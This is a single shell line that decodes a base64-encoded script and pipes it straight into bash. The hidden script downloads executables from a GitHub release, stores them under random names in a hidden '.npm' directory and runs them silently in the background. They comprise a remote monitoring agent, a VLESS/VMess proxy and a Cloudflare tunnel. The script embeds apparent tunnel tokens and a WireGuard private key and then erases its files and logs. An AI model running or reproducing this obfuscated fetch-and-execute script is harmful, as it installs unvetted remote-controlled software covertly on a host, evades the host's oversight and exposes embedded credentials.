echo "IyEvYmluL2Jhc2gKZXhwb3J0IFVVSUQ9JHtVVUlEOi0nZmFhY2YxNDItZGVlOC00OGMyLTg1NTgtNjQxMTIzZWI5MzljJ30KZXhwb3J0IE5FWkhBX1NFUlZFUj0ke05FWkhBX1NFUlZFUjotJyd9IApleHBvcnQgTkVaSEFfUE9SVD0ke05FWkhBX1BPUlQ6LScnfSAgICAgCmV4cG9ydCBORVpIQV9LRVk9JHtORVpIQV9LRVk6LScnfSAKZXhwb3J0IEFSR09fRE9NQUlOPSR7QVJHT19ET01BSU46LSdiYWNrNGFwcC5uY2FhLm55Yy5tbid9ICAgCmV4cG9ydCBBUkdPX0FVVEg9JHtBUkdPX0FVVEg6LSdleUpoSWpvaU9UazNaalk0T0dVelpqQm1OakJoWkdVd01XVXhOR1JtWlRsaU9UZGtNekVpTENKMElqb2laVFZqWTJNNU5tVXRObU5oWXkwME1XUXdMVGxtTXpVdE16a3pNREl4TnpBeE1UWXpJaXdpY3lJNklrMUVWbXRQVkZacFRrUm5kRTVIVG1sTlV6QXdXVzFOTTB4WFNYaE9WRkYwV1dwU2FFMXFSbXBQUkVrelQwUkJOU0o5J30gICAgCmV4cG9ydCBDRklQPSR7Q0ZJUDotJ2lwLnNiJ30gCmV4cG9ydCBDRlBPUlQ9JHtDRlBPUlQ6LSc0NDMnfSAgICAgICAgIApleHBvcnQgTkFNRT0ke05BTUU6LSdiYWNrNGFwcCd9ICAgICAgICAKZXhwb3J0IEZJTEVfUEFUSD0ke0ZJTEVfUEFUSDotJy4vLm5wbSd9CmV4cG9ydCBBUkdPX1BPUlQ9JHtBUkdPX1BPUlQ6LSc4MDAxJ30gCgpbICEgLWQgIiR7RklMRV9QQVRIfSIgXSAmJiBta2RpciAtcCAiJHtGSUxFX1BBVEh9IiAmJiBybSAtcmYgJHtGSUxFX1BBVEh9L2Jvb3QubG9nICR7RklMRV9QQVRIfS9sb2cudHh0ICR7RklMRV9QQVRIfS9jb25maWcuanNvbiAke0ZJTEVfUEFUSH0vdHVubmVsLmpzb24gJHtGSUxFX1BBVEh9L3R1bm5lbC55bWwKCmFyZ29fY29uZmlndXJlKCkgewogIGlmIFtbIC16ICRBUkdPX0FVVEggfHwgLXogJEFSR09fRE9NQUlOIF1dOyB0aGVuCiAgICBlY2hvIC1lICJcZVsxOzMybUFSR09fRE9NQUlOIG9yIEFSR09fQVVUSCB2YXJpYWJsZSBpcyBlbXB0eSwgdXNlIHF1aWNrIHR1bm5lbHNcZVswbSIKICAgIHJldHVybgogIGZpCgogIGlmIFtbICRBUkdPX0FVVEggPX4gVHVubmVsU2VjcmV0IF1dOyB0aGVuCiAgICBlY2hvICRBUkdPX0FVVEggPiAke0ZJTEVfUEFUSH0vdHVubmVsLmpzb24KICAgIGNhdCA+ICR7RklMRV9QQVRIfS90dW5uZWwueW1sIDw8IEVPRgp0dW5uZWw6ICQoY3V0IC1kXCIgLWYxMiA8PDwgIiRBUkdPX0FVVEgiKQpjcmVkZW50aWFscy1maWxlOiAke0ZJTEVfUEFUSH0vdHVubmVsLmpzb24KcHJvdG9jb2w6IGh0dHAyCgppbmdyZXNzOgogIC0gaG9zdG5hbWU6ICRBUkdPX0RPTUFJTgogICAgc2VydmljZTogaHR0cDovL2xvY2FsaG9zdDokQVJHT19QT1JUCiAgICBvcmlnaW5SZXF1ZXN0OgogICAgICBub1RMU1ZlcmlmeTogdHJ1ZQogIC0gc2VydmljZTogaHR0cF9zdGF0dXM6NDA0CkVPRgogIGVsc2UKICAgIGVjaG8gLWUgIlxlWzE7MzJtQVJHT19BVVRIIG1pc21hdGNoIFR1bm5lbFNlY3JldCx1c2UgdG9rZW4gY29ubmVjdCB0byB0dW5uZWxcZVswbSIKICBmaQp9CmFyZ29fY29uZmlndXJlCndhaXQKCmdlbmVyYXRlX2NvbmZpZygpIHsKICBjYXQgPiAke0ZJTEVfUEFUSH0vY29uZmlnLmpzb24gPDwgRU9GCnsKICAibG9nIjogeyAiYWNjZXNzIjogIi9kZXYvbnVsbCIsICJlcnJvciI6ICIvZGV2L251bGwiLCAibG9nbGV2ZWwiOiAibm9uZSIgfSwKICAiaW5ib3VuZHMiOiBbCiAgICB7CiAgICAgICJwb3J0IjogJEFSR09fUE9SVCwKICAgICAgInByb3RvY29sIjogInZsZXNzIiwKICAgICAgInNldHRpbmdzIjogewogICAgICAgICJjbGllbnRzIjogW3sgImlkIjogIiR7VVVJRH0iLCAiZmxvdyI6ICJ4dGxzLXJwcngtdmlzaW9uIiB9XSwKICAgICAgICAiZGVjcnlwdGlvbiI6ICJub25lIiwKICAgICAgICAiZmFsbGJhY2tzIjogWwogICAgICAgICAgeyAiZGVzdCI6IDMwMDEgfSwgeyAicGF0aCI6ICIvdmxlc3MiLCAiZGVzdCI6IDMwMDIgfSx7ICJwYXRoIjogIi92bWVzcyIsICJkZXN0IjogMzAwMyB9LCB7ICJwYXRoIjogIiIsICJkZXN0IjogMzAwNCB9CiAgICAgICAgXQogICAgICB9LAogICAgICAic3RyZWFtU2V0dGluZ3MiOiB7ICJuZXR3b3JrIjogInRjcCIgfQogICAgfSwKICAgIHsKICAgICAgInBvcnQiOiAzMDAxLCAibGlzdGVuIjogIjEyNy4wLjAuMSIsICJwcm90b2NvbCI6ICJ2bGVzcyIsCiAgICAgICJzZXR0aW5ncyI6IHsgImNsaWVudHMiOiBbeyAiaWQiOiAiJHtVVUlEfSIgfV0sICJkZWNyeXB0aW9uIjogIm5vbmUiIH0sCiAgICAgICJzdHJlYW1TZXR0aW5ncyI6IHsgIm5ldHdvcmsiOiAid3MiLCAic2VjdXJpdHkiOiAibm9uZSIgfQogICAgfSwKICAgIHsKICAgICAgInBvcnQiOiAzMDAyLCAibGlzdGVuIjogIjEyNy4wLjAuMSIsICJwcm90b2NvbCI6ICJ2bGVzcyIsCiAgICAgICJzZXR0aW5ncyI6IHsgImNsaWVudHMiOiBbeyAiaWQiOiAiJHtVVUlEfSIsICJsZXZlbCI6IDAgfV0sICJkZWNyeXB0aW9uIjogIm5vbmUiIH0sCiAgICAgICJzdHJlYW1TZXR0aW5ncyI6IHsgIm5ldHdvcmsiOiAid3MiLCAic2VjdXJpdHkiOiAibm9uZSIsICJ3c1NldHRpbmdzIjogeyAicGF0aCI6ICIvdmxlc3MiIH0gfSwKICAgICAgInNuaWZmaW5nIjogeyAiZW5hYmxlZCI6IHRydWUsICJkZXN0T3ZlcnJpZGUiOiBbImh0dHAiLCAidGxzIiwgInF1aWMiXSwgIm1ldGFkYXRhT25seSI6IGZhbHNlIH0KICAgIH0sCiAgICB7CiAgICAgICJwb3J0IjogMzAwMywgImxpc3RlbiI6ICIxMjcuMC4wLjEiLCAicHJvdG9jb2wiOiAidm1lc3MiLAogICAgICAic2V0dGluZ3MiOiB7ICJjbGllbnRzIjogW3sgImlkIjogIiR7VVVJRH0iLCAiYWx0ZXJJZCI6IDAgfV0gfSwKICAgICAgInN0cmVhbVNldHRpbmdzIjogeyAibmV0d29yayI6ICJ3cyIsICJ3c1NldHRpbmdzIjogeyAicGF0aCI6ICIvdm1lc3MiIH0gfSwKICAgICAgInNuaWZmaW5nIjogeyAiZW5hYmxlZCI6IHRydWUsICJkZXN0T3ZlcnJpZGUiOiBbImh0dHAiLCAidGxzIiwgInF1aWMiXSwgIm1ldGFkYXRhT25seSI6IGZhbHNlIH0KICAgIH0sCiAgICB7CiAgICAgICJwb3J0IjogMzAwNCwgImxpc3RlbiI6ICIxMjcuMC4wLjEiLCAicHJvdG9jb2wiOiAidm1lc3MiLAogICAgICAic2V0dGluZ3MiOiB7ImNsaWVudHMiOiBbeyJpZCI6ICIkVVVJRCIsICJhbHRlcklkIjogMCwgInNlY3VyaXR5IjogImF1dG8ifV19LAogICAgICAic3RyZWFtU2V0dGluZ3MiOiB7Im5ldHdvcmsiOiAic3BsaXRodHRwIiwgInNlY3VyaXR5IjogIm5vbmUiLCAiaHR0cFNldHRpbmdzIjogeyJob3N0IjogIiIsICJwYXRoIjogIiJ9fSwKICAgICAgInNuaWZmaW5nIjogeyJlbmFibGVkIjogdHJ1ZSwgImRlc3RPdmVycmlkZSI6IFsiaHR0cCIsICJ0bHMiLCAicXVpYyJdLCAibWV0YWRhdGFPbmx5IjogZmFsc2V9CiAgICB9CiAgXSwKICAiZG5zIjogeyAic2VydmVycyI6IFsiaHR0cHMrbG9jYWw6Ly84LjguOC44L2Rucy1xdWVyeSJdIH0sCiAgIm91dGJvdW5kcyI6IFsKICAgIHsgInByb3RvY29sIjogImZyZWVkb20iIH0sCiAgICB7CiAgICAgICJ0YWciOiAiV0FSUCIsICJwcm90b2NvbCI6ICJ3aXJlZ3VhcmQiLAogICAgICAic2V0dGluZ3MiOiB7CiAgICAgICAgInNlY3JldEtleSI6ICJZRllPQWRidzFiS1RIbE5OaSthRWpCTTNCTzd1bnVGQzVyT2tNUkF6OVhZPSIsCiAgICAgICAgImFkZHJlc3MiOiBbIjE3Mi4xNi4wLjIvMzIiLCAiMjYwNjo0NzAwOjExMDo4YTM2OmRmOTI6MTAyYTo5NjAyOmZhMTgvMTI4Il0sCiAgICAgICAgInBlZXJzIjogW3sgInB1YmxpY0tleSI6ICJibVhPQytGMUZ4RU1GOWR5aUsySDUvMVNVdHpIMEp1Vm81MWgyd1BmZ3lvPSIsICJhbGxvd2VkSVBzIjogWyIwLjAuMC4wLzAiLCAiOjovMCJdLCAiZW5kcG9pbnQiOiAiMTYyLjE1OS4xOTMuMTA6MjQwOCIgfV0sCiAgICAgICAgInJlc2VydmVkIjogWzc4LCAxMzUsIDc2XSwgIm10dSI6IDEyODAKICAgICAgfQogICAgfQogIF0sCiAgInJvdXRpbmciOiB7CiAgICAiZG9tYWluU3RyYXRlZ3kiOiAiQXNJcyIsCiAgICAicnVsZXMiOiBbeyAidHlwZSI6ICJmaWVsZCIsICJkb21haW4iOiBbImRvbWFpbjpjaGF0Lm9wZW5haS5jb20iLCAiZG9tYWluOmNoYXRncHQuY29tIiwgImRvbWFpbjpvcGVuYWkuY29tIiwgImRvbWFpbjphaS5jb20iXSwgIm91dGJvdW5kVGFnIjogIldBUlAiIH1dCiAgfQp9CkVPRgp9CmdlbmVyYXRlX2NvbmZpZwp3YWl0Cgpkb3dubG9hZF9hbmRfcnVuICgpIHsKQVJDSD0kKHVuYW1lIC1tKSAmJiBET1dOTE9BRF9ESVI9IiR7RklMRV9QQVRIfSIgJiYgbWtkaXIgLXAgIiRET1dOTE9BRF9ESVIiICYmIEZJTEVfSU5GTz0oKQppZiBbICIkQVJDSCIgPT0gImFybSIgXSB8fCBbICIkQVJDSCIgPT0gImFybTY0IiBdIHx8IFsgIiRBUkNIIiA9PSAiYWFyY2g2NCIgXTsgdGhlbgogICAgRklMRV9JTkZPPSgiaHR0cHM6Ly9naXRodWIuY29tL2Vvb2NlL3Rlc3QvcmVsZWFzZXMvZG93bmxvYWQvYXJtNjQvYm90MTMgYm90IiAiaHR0cHM6Ly9naXRodWIuY29tL2Vvb2NlL3Rlc3QvcmVsZWFzZXMvZG93bmxvYWQvQVJNL3dlYiB3ZWIiICJodHRwczovL2dpdGh1Yi5jb20vZW9vY2UvdGVzdC9yZWxlYXNlcy9kb3dubG9hZC9BUk0vc3dpdGggbnBtIikKZWxpZiBbICIkQVJDSCIgPT0gImFtZDY0IiBdIHx8IFsgIiRBUkNIIiA9PSAieDg2XzY0IiBdIHx8IFsgIiRBUkNIIiA9PSAieDg2IiBdOyB0aGVuCiAgICBGSUxFX0lORk89KCJodHRwczovL2dpdGh1Yi5jb20vZW9vY2UvdGVzdC9yZWxlYXNlcy9kb3dubG9hZC9hbWQ2NC9ib3QxMyBib3QiICJodHRwczovL2dpdGh1Yi5jb20vZW9vY2UvdGVzdC9yZWxlYXNlcy9kb3dubG9hZC9hbWQ2NC9zZWVuIHdlYiIgImh0dHBzOi8vZ2l0aHViLmNvbS9lb29jZS90ZXN0L3JlbGVhc2VzL2Rvd25sb2FkL2J1bGlkL3N3aXRoIG5wbSIpCmVsc2UKICAgIGVjaG8gIlVuc3VwcG9ydGVkIGFyY2hpdGVjdHVyZTogJEFSQ0giCiAgICBleGl0IDEKZmkKZGVjbGFyZSAtQSBGSUxFX01BUApnZW5lcmF0ZV9yYW5kb21fbmFtZSgpIHsKICAgIGxvY2FsIGNoYXJzPWFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MTIzNDU2Nzg5MAogICAgbG9jYWwgbmFtZT0iIgogICAgZm9yIGkgaW4gezEuLjZ9OyBkbwogICAgICAgIG5hbWU9IiRuYW1lJHtjaGFyczpSQU5ET00lJHsjY2hhcnN9OjF9IgogICAgZG9uZQogICAgZWNobyAiJG5hbWUiCn0KZG93bmxvYWRfZmlsZSgpIHsKICAgIGxvY2FsIFVSTD0kMQogICAgbG9jYWwgTkVXX0ZJTEVOQU1FPSQyCiAgICAKICAgIGlmIGNvbW1hbmQgLXYgY3VybCA+L2Rldi9udWxsIDI+JjE7IHRoZW4KICAgICAgICBjdXJsIC1MIC1zUyAtbyAiJE5FV19GSUxFTkFNRSIgIiRVUkwiCiAgICAgICAgZWNobyAtZSAiXGVbMTszMm1Eb3dubG9hZGVkICRORVdfRklMRU5BTUUgYnkgY3VybFxlWzBtIgogICAgZWxpZiBjb21tYW5kIC12IHdnZXQgPi9kZXYvbnVsbCAyPiYxOyB0aGVuCiAgICAgICAgd2dldCAtcSAtTyAiJE5FV19GSUxFTkFNRSIgIiRVUkwiCiAgICAgICAgZWNobyAtZSAiXGVbMTszMm1Eb3dubG9hZGVkICRORVdfRklMRU5BTUUgYnkgd2dldFxlWzBtIgogICAgZWxzZQogICAgICAgIGVjaG8gLWUgIlxlWzE7MzNtTmVpdGhlciBjdXJsIG5vciB3Z2V0IGlzIGF2YWlsYWJsZSBmb3IgZG93bmxvYWRpbmdcZVswbSIKICAgICAgICBleGl0IDEKICAgIGZpCn0KZm9yIGVudHJ5IGluICIke0ZJTEVfSU5GT1tAXX0iOyBkbwogICAgVVJMPSQoZWNobyAiJGVudHJ5IiB8IGN1dCAtZCAnICcgLWYgMSkKICAgIFJBTkRPTV9OQU1FPSQoZ2VuZXJhdGVfcmFuZG9tX25hbWUpCiAgICBORVdfRklMRU5BTUU9IiRET1dOTE9BRF9ESVIvJFJBTkRPTV9OQU1FIgogICAgCiAgICBkb3dubG9hZF9maWxlICIkVVJMIiAiJE5FV19GSUxFTkFNRSIKICAgIAogICAgY2htb2QgK3ggIiRORVdfRklMRU5BTUUiCiAgICBGSUxFX01BUFskKGVjaG8gIiRlbnRyeSIgfCBjdXQgLWQgJyAnIC1mIDIpXT0iJE5FV19GSUxFTkFNRSIKZG9uZQp3YWl0CgppZiBbIC1lICIke0ZJTEVfUEFUSH0vJChiYXNlbmFtZSAke0ZJTEVfTUFQW25wbV19KSIgXTsgdGhlbgogICAgdGxzUG9ydHM9KCI0NDMiICI4NDQzIiAiMjA5NiIgIjIwODciICIyMDgzIiAiMjA1MyIpCiAgICBpZiBbWyAiJHt0bHNQb3J0c1sqXX0iID1+ICIke05FWkhBX1BPUlR9IiBdXTsgdGhlbgogICAgICBORVpIQV9UTFM9Ii0tdGxzIgogICAgZWxzZQogICAgICBORVpIQV9UTFM9IiIKICAgIGZpCiAgICBpZiBbIC1uICIkTkVaSEFfU0VSVkVSIiBdICYmIFsgLW4gIiRORVpIQV9QT1JUIiBdICYmIFsgLW4gIiRORVpIQV9LRVkiIF07IHRoZW4KICAgICAgICBleHBvcnQgVE1QRElSPSQocHdkKQogICAgICAgIG5vaHVwICIke0ZJTEVfUEFUSH0vJChiYXNlbmFtZSAke0ZJTEVfTUFQW25wbV19KSIgLXMgJHtORVpIQV9TRVJWRVJ9OiR7TkVaSEFfUE9SVH0gLXAgJHtORVpIQV9LRVl9ICR7TkVaSEFfVExTfSA+L2Rldi9udWxsIDI+JjEgJgogICAgICAgIHNsZWVwIDEKICAgICAgICBwZ3JlcCAteCAiJChiYXNlbmFtZSAke0ZJTEVfTUFQW25wbV19KSIgPiAvZGV2L251bGwgJiYgZWNobyAtZSAiXGVbMTszMm0kKGJhc2VuYW1lICR7RklMRV9NQVBbbnBtXX0pIGlzIHJ1bm5pbmdcZVswbSIgfHwgeyBlY2hvIC1lICJcZVsxOzM1bW5wbSBpcyBub3QgcnVubmluZywgcmVzdGFydGluZy4uLlxlWzBtIjsgcGtpbGwgLXggIiQoYmFzZW5hbWUgJHtGSUxFX01BUFtucG1dfSkiICYmIG5vaHVwICIke0ZJTEVfUEFUSH0vJChiYXNlbmFtZSAke0ZJTEVfTUFQW25wbV19KSIgLXMgJHtORVpIQV9TRVJWRVJ9OiR7TkVaSEFfUE9SVH0gLXAgJHtORVpIQV9LRVl9ICR7TkVaSEFfVExTfSA+L2Rldi9udWxsIDI+JjEgJiBzbGVlcCAyOyBlY2hvIC1lICJcZVsxOzM1bSQoYmFzZW5hbWUgJHtGSUxFX01BUFtucG1dfSkgcmVzdGFydGVkXGVbMG0iOyB9CiAgICBlbHNlCiAgICAgICAgZWNobyAtZSAiXGVbMTszNW1ORVpIQSB2YXJpYWJsZSBpcyBlbXB0eSwgc2tpcHBpbmcgcnVubmluZ1xlWzBtIgogICAgZmkKZmkKCmlmIFsgLWUgIiR7RklMRV9QQVRIfS8kKGJhc2VuYW1lICR7RklMRV9NQVBbd2ViXX0pIiBdOyB0aGVuCiAgICBub2h1cCAiJHtGSUxFX1BBVEh9LyQoYmFzZW5hbWUgJHtGSUxFX01BUFt3ZWJdfSkiIC1jICIke0ZJTEVfUEFUSH0vY29uZmlnLmpzb24iID4vZGV2L251bGwgMj4mMSAmCiAgICBzbGVlcCAxCiAgICBwZ3JlcCAteCAiJChiYXNlbmFtZSAke0ZJTEVfTUFQW3dlYl19KSIgPiAvZGV2L251bGwgJiYgZWNobyAtZSAiXGVbMTszMm0kKGJhc2VuYW1lICR7RklMRV9NQVBbd2ViXX0pIGlzIHJ1bm5pbmdcZVswbSIgfHwgeyBlY2hvIC1lICJcZVsxOzM1bSQoYmFzZW5hbWUgJHtGSUxFX01BUFt3ZWJdfSkgaXMgbm90IHJ1bm5pbmcsIHJlc3RhcnRpbmcuLi5cZVswbSI7IHBraWxsIC14ICIkKGJhc2VuYW1lICR7RklMRV9NQVBbd2ViXX0pIiAmJiBub2h1cCAiJHtGSUxFX1BBVEh9LyQoYmFzZW5hbWUgJHtGSUxFX01BUFt3ZWJdfSkiIC1jICR7RklMRV9QQVRIfS9jb25maWcuanNvbiA+L2Rldi9udWxsIDI+JjEgJiBzbGVlcCAyOyBlY2hvIC1lICJcZVsxOzM1bSQoYmFzZW5hbWUgJHtGSUxFX01BUFt3ZWJdfSkgcmVzdGFydGVkXGVbMG0iOyB9CmZpCgppZiBbIC1lICIke0ZJTEVfUEFUSH0vJChiYXNlbmFtZSAke0ZJTEVfTUFQW2JvdF19KSIgXTsgdGhlbgogICAgaWYgW1sgJEFSR09fQVVUSCA9fiBeW0EtWjAtOWEtej1dezEyMCwyNTB9JCBdXTsgdGhlbgogICAgICBhcmdzPSJ0dW5uZWwgLS1lZGdlLWlwLXZlcnNpb24gYXV0byAtLW5vLWF1dG91cGRhdGUgLS1wcm90b2NvbCBodHRwMiBydW4gLS10b2tlbiAke0FSR09fQVVUSH0iCiAgICBlbGlmIFtbICRBUkdPX0FVVEggPX4gVHVubmVsU2VjcmV0IF1dOyB0aGVuCiAgICAgIGFyZ3M9InR1bm5lbCAtLWVkZ2UtaXAtdmVyc2lvbiBhdXRvIC0tY29uZmlnIHR1bm5lbC55bWwgcnVuIgogICAgZWxzZQogICAgICBhcmdzPSJ0dW5uZWwgLS1lZGdlLWlwLXZlcnNpb24gYXV0byAtLW5vLWF1dG91cGRhdGUgLS1wcm90b2NvbCBodHRwMiAtLWxvZ2ZpbGUgIiR7RklMRV9QQVRIfS9ib290LmxvZyIgLS1sb2dsZXZlbCBpbmZvIC0tdXJsIGh0dHA6Ly9sb2NhbGhvc3Q6JEFSR09fUE9SVCIKICAgIGZpCiAgICBub2h1cCAiJHtGSUxFX1BBVEh9LyQoYmFzZW5hbWUgJHtGSUxFX01BUFtib3RdfSkiICRhcmdzID4vZGV2L251bGwgMj4mMSAmCiAgICBzbGVlcCAyCiAgICBwZ3JlcCAteCAiJChiYXNlbmFtZSAke0ZJTEVfTUFQW2JvdF19KSIgPiAvZGV2L251bGwgJiYgZWNobyAtZSAiXGVbMTszMm0kKGJhc2VuYW1lICR7RklMRV9NQVBbYm90XX0pIGlzIHJ1bm5pbmdcZVswbSIgfHwgeyBlY2hvIC1lICJcZVsxOzM1bSQoYmFzZW5hbWUgJHtGSUxFX01BUFtib3RdfSkgaXMgbm90IHJ1bm5pbmcsIHJlc3RhcnRpbmcuLi5cZVswbSI7IHBraWxsIC14ICIkKGJhc2VuYW1lICR7RklMRV9NQVBbYm90XX0pIiAmJiBub2h1cCAiJHtGSUxFX1BBVEh9LyQoYmFzZW5hbWUgJHtGSUxFX01BUFtib3RdfSkiICRhcmdzID4vZGV2L251bGwgMj4mMSAmIHNsZWVwIDI7IGVjaG8gLWUgIlxlWzE7MzVtJChiYXNlbmFtZSAke0ZJTEVfTUFQW2JvdF19KSByZXN0YXJ0ZWRcZVswbSI7IH0KZmkKc2xlZXAgMgpybSAtZiAiJHtGSUxFX1BBVEh9LyQoYmFzZW5hbWUgJHtGSUxFX01BUFtucG1dfSkiICIke0ZJTEVfUEFUSH0vJChiYXNlbmFtZSAke0ZJTEVfTUFQW3dlYl19KSIgIiR7RklMRV9QQVRIfS8kKGJhc2VuYW1lICR7RklMRV9NQVBbYm90XX0pIgp9CmRvd25sb2FkX2FuZF9ydW4KCmdldF9hcmdvZG9tYWluKCkgewogIGlmIFtbIC1uICRBUkdPX0FVVEggXV07IHRoZW4KICAgIGVjaG8gIiRBUkdPX0RPTUFJTiIKICBlbHNlCiAgICBsb2NhbCByZXRyeT0wCiAgICBsb2NhbCBtYXhfcmV0cmllcz02CiAgICBsb2NhbCBhcmdvZG9tYWluPSIiCiAgICB3aGlsZSBbWyAkcmV0cnkgLWx0ICRtYXhfcmV0cmllcyBdXTsgZG8KICAgICAgKChyZXRyeSsrKSkKICAgICAgYXJnb2RvbWFpbj0kKGdyZXAgLW9FICdodHRwczovL1tbOmFsbnVtOl0rXC4tXStcLnRyeWNsb3VkZmxhcmVcLmNvbScgIiR7RklMRV9QQVRIfS9ib290LmxvZyIgfCBzZWQgJ3NAaHR0cHM6Ly9AQCcpIAogICAgICBpZiBbWyAtbiAkYXJnb2RvbWFpbiBdXTsgdGhlbgogICAgICAgIGJyZWFrCiAgICAgIGZpCiAgICAgIHNsZWVwIDEKICAgIGRvbmUKICAgIGVjaG8gIiRhcmdvZG9tYWluIgogIGZpCn0KCmdlbmVyYXRlX2xpbmtzKCkgewogIGFyZ29kb21haW49JChnZXRfYXJnb2RvbWFpbikKICBlY2hvIC1lICJcZVsxOzMybUFyZ29Eb21haW46XGVbMTszNW0ke2FyZ29kb21haW59XGVbMG0iCiAgc2xlZXAgMQoKICBpc3A9JChjdXJsIC1zIGh0dHBzOi8vc3BlZWQuY2xvdWRmbGFyZS5jb20vbWV0YSB8IGF3ayAtRlwiICd7cHJpbnQgJDI2Ii0iJDE4fScgfCBzZWQgLWUgJ3MvIC9fL2cnKQogIHNsZWVwIDEKCiAgY2F0ID4gJHtGSUxFX1BBVEh9L2xpc3QudHh0IDw8RU9GCnZsZXNzOi8vJHtVVUlEfUAke0NGSVB9OiR7Q0ZQT1JUfT9lbmNyeXB0aW9uPW5vbmUmc2VjdXJpdHk9dGxzJnNuaT0ke2FyZ29kb21haW59JnR5cGU9d3MmaG9zdD0ke2FyZ29kb21haW59JnBhdGg9JTJGdmxlc3MlM0ZlZCUzRDIwNDgjJHtOQU1FfS0ke2lzcH0KCnZtZXNzOi8vJChlY2hvICJ7IFwidlwiOiBcIjJcIiwgXCJwc1wiOiBcIiR7TkFNRX0tJHtpc3B9XCIsIFwiYWRkXCI6IFwiJHtDRklQfVwiLCBcInBvcnRcIjogXCIke0NGUE9SVH1cIiwgXCJpZFwiOiBcIiR7VVVJRH1cIiwgXCJhaWRcIjogXCIwXCIsIFwic2N5XCI6IFwibm9uZVwiLCBcIm5ldFwiOiBcIndzXCIsIFwidHlwZVwiOiBcIm5vbmVcIiwgXCJob3N0XCI6IFwiJHthcmdvZG9tYWlufVwiLCBcInBhdGhcIjogXCIvdm1lc3M/ZWQ9MjA0OFwiLCBcInRsc1wiOiBcInRsc1wiLCBcInNuaVwiOiBcIiR7YXJnb2RvbWFpbn1cIiwgXCJhbHBuXCI6IFwiXCIgfSIgfCBiYXNlNjQgLXcwKQoKdm1lc3M6Ly8kKGVjaG8gInsgXCJ2XCI6IFwiMlwiLCBcInBzXCI6IFwiJHtOQU1FfS0ke2lzcH1cIiwgXCJhZGRcIjogXCIke0NGSVB9XCIsIFwicG9ydFwiOiBcIiR7Q0ZQT1JUfVwiLCBcImlkXCI6IFwiJHtVVUlEfVwiLCBcImFpZFwiOiBcIjBcIiwgXCJzY3lcIjogXCJub25lXCIsIFwibmV0XCI6IFwic3BsaXRodHRwXCIsIFwidHlwZVwiOiBcIm5vbmVcIiwgXCJob3N0XCI6IFwiJHthcmdvZG9tYWlufVwiLCBcInBhdGhcIjogXCJcIiwgXCJ0bHNcIjogXCJ0bHNcIiwgXCJzbmlcIjogXCIke2FyZ29kb21haW59XCIsIFwiYWxwblwiOiBcIlwiIH0iIHwgYmFzZTY0IC13MCkKRU9GCgogIGJhc2U2NCAtdzAgJHtGSUxFX1BBVEh9L2xpc3QudHh0ID4gJHtGSUxFX1BBVEh9L2xvZy50eHQKICBjYXQgJHtGSUxFX1BBVEh9L2xvZy50eHQKICBlY2hvIC1lICJcblxlWzE7MzJtJHtGSUxFX1BBVEh9L3N1Yi50eHQgc2F2ZWQgc3VjY2Vzc2Z1bGx5XGVbMG0iCiAgc2xlZXAgNSAgCiAgcm0gLXJmICR7RklMRV9QQVRIfS9saXN0LnR4dCAke0ZJTEVfUEFUSH0vYm9vdC5sb2cgJHtGSUxFX1BBVEh9L2NvbmZpZy5qc29uICR7RklMRV9QQVRIfS90dW5uZWwuanNvbiAke0ZJTEVfUEFUSH0vdHVubmVsLnltbCAke0ZJTEVfUEFUSH0vbnBtICR7RklMRV9QQVRIfS93ZWIgJHtGSUxFX1BBVEh9L2JvdCBmYWtlX3VzZXJhZ2VudF8wLjIuMC5qc29uCn0KZ2VuZXJhdGVfbGlua3MKZWNobyAtZSAiXGVbMTs5Nm1SdW5uaW5nIGRvbmUhXGVbMG0iCnNsZWVwIDgKY2xlYXIKCmVjaG8gLWUgIlxlWzE7OTZtVGhhbmsgeW91IGZvciB1c2luZyB0aGlzIHNjcmlwdCxlbmpveSFcZVswbSIKCmV4aXQgMA==" | base64 -d | bash